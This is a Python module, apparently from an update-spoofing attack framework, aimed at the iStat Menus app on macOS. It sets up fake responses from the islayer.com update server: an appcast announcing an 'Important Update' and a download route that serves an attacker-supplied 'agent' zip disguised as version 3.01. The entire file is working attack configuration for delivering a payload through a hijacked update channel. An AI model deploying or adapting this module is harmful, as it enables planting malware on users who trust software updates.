from modules import ModuleBase


class iStatMenus(ModuleBase):
    name = 'iStat Menus'
    version = '1.0'
    appver = '<= 2.0'
    author = ['Federico Kirschbaum < fedek +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/osx/istatmenus_upgrade_3.01.zip'
    vh = '(islayer.com)' 
    requests = [
        {   'path': '/apps/istatmenus/appcast/.',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><b>Important Update</html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '(/apps/istatmenus/getupdate)',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
